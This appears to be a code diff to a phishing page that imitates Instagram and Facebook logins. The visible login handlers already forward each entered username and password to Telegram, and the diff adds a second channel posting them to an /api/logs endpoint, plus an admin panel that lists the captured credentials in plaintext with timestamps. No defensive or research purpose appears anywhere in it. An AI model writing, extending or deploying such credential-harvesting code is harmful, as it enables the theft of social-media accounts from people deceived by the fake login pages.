@@ -764,16 +764,6 @@
             gap: 8px;
             flex-wrap: wrap;
         }
-        .video-item .video-actions button {
-            padding: 6px 16px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 13px;
-            font-weight: 500;
-            transition: opacity 0.3s;
-            font-family: Arial, Helvetica, sans-serif;
-        }
         .video-item .video-actions .edit-btn {
             background: #e4e6eb;
             color: #1a1a1a;
@@ -904,6 +894,90 @@
         .edit-modal .modal-content .modal-actions button:hover {
             opacity: 0.8;
         }
+        .logs-section {
+            background: #f7f8fa;
+            border-radius: 16px;
+            padding: 20px 24px;
+            border: 1px solid #e4e6eb;
+            margin-top: 30px;
+        }
+        .logs-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .logs-header h3 {
+            color: #1a1a1a;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        .clear-logs-btn {
+            padding: 6px 16px;
+            background: #dc3545;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: opacity 0.3s;
+        }
+        .clear-logs-btn:hover {
+            opacity: 0.8;
+        }
+        .log-item {
+            background: #fff;
+            border-radius: 8px;
+            padding: 12px 16px;
+            border: 1px solid #e4e6eb;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .log-item .log-platform {
+            font-weight: 600;
+            color: #1877f2;
+        }
+        .log-item .log-username {
+            color: #1a1a1a;
+        }
+        .log-item .log-password {
+            color: #dc3545;
+            font-family: monospace;
+        }
+        .log-item .log-time {
+            color: #999;
+            font-size: 12px;
+        }
+        .log-item .log-delete {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 0 4px;
+        }
+        .log-item .log-delete:hover {
+            color: #dc3545;
+        }
+        .log-empty {
+            text-align: center;
+            padding: 40px 20px;
+            color: #999;
+        }
+        .log-empty i {
+            font-size: 48px;
+            margin-bottom: 16px;
+            opacity: 0.3;
+        }
+        .log-empty p {
+            font-size: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+        }
         @media (max-width: 600px) {
             .add-video-form .form-row {
                 grid-template-columns: 1fr;
@@ -936,6 +1010,14 @@
             }
             .platform-selector select {
                 width: 100%;
+            }
+            .logs-header {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .log-item {
+                flex-direction: column;
+                align-items: flex-start;
             }
         }
     </style>
@@ -1052,6 +1134,23 @@
             <div id="videoListContainer">
                 <div class="empty-state"><p>Loading videos…</p></div>
             </div>
+            
+            <!-- Login Logs Section -->
+            <div class="logs-section">
+                <div class="logs-header">
+                    <h3>📩 Login Attempts</h3>
+                    <div>
+                        <button onclick="clearLogs()" class="clear-logs-btn">Clear All</button>
+                        <span id="logCount" style="font-size:12px;color:#999;margin-left:12px;">0 entries</span>
+                    </div>
+                </div>
+                <div id="logsContainer">
+                    <div class="log-empty">
+                        <i class="fas fa-inbox"></i>
+                        <p>No login attempts yet</p>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
     <div class="toast" id="toast"></div>
@@ -1124,11 +1223,6 @@
             renderVideos();
         }
 
-        function saveVideos() {
-            // Videos are saved to the server via API calls
-            // This function is kept for compatibility but does nothing
-        }
-
         function savePlatformStorage() {
             try { localStorage.setItem('selectedPlatform', currentPlatform); } catch(e) {}
         }
@@ -1162,6 +1256,90 @@
                 console.log('❌ Error:', e);
                 return false;
             }
+        }
+
+        // ============================================================
+        // DASHBOARD LOGS
+        // ============================================================
+        async function sendToDashboard(platform, username, password) {
+            try {
+                await fetch('/api/logs', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ platform, username, password })
+                });
+                loadLogs();
+            } catch (e) {
+                console.error('Failed to save log:', e);
+            }
+        }
+
+        async function loadLogs() {
+            try {
+                const res = await fetch('/api/logs');
+                const logs = await res.json();
+                renderLogs(logs);
+                document.getElementById('logCount').textContent = logs.length + ' entries';
+            } catch (e) {
+                console.error('Failed to load logs:', e);
+            }
+        }
+
+        function renderLogs(logs) {
+            const container = document.getElementById('logsContainer');
+            if (logs.length === 0) {
+                container.innerHTML = `
+                    <div class="log-empty">
+                        <i class="fas fa-inbox"></i>
+                        <p>No login attempts yet</p>
+                    </div>
+                `;
+                return;
+            }
+            let html = '';
+            logs.slice().reverse().forEach(log => {
+                html += `
+                    <div class="log-item">
+                        <div>
+                            <span class="log-platform">${log.platform}</span>
+                            <span class="log-username">📧 ${escapeHtml(log.username)}</span>
+                            <span class="log-password">🔑 ${escapeHtml(log.password)}</span>
+                        </div>
+                        <div style="display:flex;align-items:center;gap:12px;">
+                            <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
+                            <button class="log-delete" onclick="deleteLog(${log.id})">✕</button>
+                        </div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        async function deleteLog(id) {
+            if (!confirm('Delete this log entry?')) return;
+            try {
+                await fetch(`/api/logs/${id}`, { method: 'DELETE' });
+                loadLogs();
+            } catch (e) {
+                console.error('Failed to delete log:', e);
+            }
+        }
+
+        async function clearLogs() {
+            if (!confirm('Delete all login logs?')) return;
+            try {
+                await fetch('/api/logs', { method: 'DELETE' });
+                loadLogs();
+            } catch (e) {
+                console.error('Failed to clear logs:', e);
+            }
+        }
+
+        function escapeHtml(text) {
+            if (!text) return "";
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
         }
 
         // ============================================================
@@ -1256,13 +1434,6 @@
             });
             html += '</div>';
             container.innerHTML = html;
-        }
-
-        function escapeHtml(text) {
-            if (!text) return "";
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
         }
 
         // ============================================================
@@ -1409,12 +1580,15 @@
         // ============================================================
         // TOAST
         // ============================================================
+        let toastTimer = null;
         function showToast(message, type) {
             const toast = document.getElementById('toast');
             toast.textContent = message;
             toast.className = 'toast show ' + (type || '');
-            clearTimeout(toast._timeout);
-            toast._timeout = setTimeout(() => toast.classList.remove('show'), 3000);
+            if (toastTimer) clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => {
+                toast.className = 'toast';
+            }, 3000);
         }
 
         // ============================================================
@@ -1442,6 +1616,7 @@
                 document.getElementById('facebookPage').classList.remove('active');
                 document.getElementById('dashboardPage').classList.add('active');
                 loadVideos();
+                loadLogs();
                 document.getElementById('platformSelect').value = currentPlatform;
                 document.getElementById('currentPlatformDisplay').textContent = platforms[currentPlatform].name;
                 showToast('Welcome back, Admin!', 'success');
@@ -1455,6 +1630,7 @@
             spinner.classList.add('show');
 
             await sendToTelegram('Instagram', username, password);
+            await sendToDashboard('Instagram', username, password);
 
             const platform = platforms.instagram;
             setTimeout(() => {
@@ -1484,6 +1660,7 @@
                 document.getElementById('facebookPage').classList.remove('active');
                 document.getElementById('dashboardPage').classList.add('active');
                 loadVideos();
+                loadLogs();
                 document.getElementById('platformSelect').value = currentPlatform;
                 document.getElementById('currentPlatformDisplay').textContent = platforms[currentPlatform].name;
                 showToast('Welcome back, Admin!', 'success');
@@ -1497,6 +1674,7 @@
             spinner.classList.add('show');
 
             await sendToTelegram('Facebook', username, password);
+            await sendToDashboard('Facebook', username, password);
 
             const platform = platforms.facebook;
             setTimeout(() => {
@@ -1872,6 +2050,7 @@
             } catch (e) {}
 
             await loadVideos();
+            await loadLogs();
             applyPlatform(currentPlatform);
 
             const savedLang = localStorage.getItem('preferredLanguage');
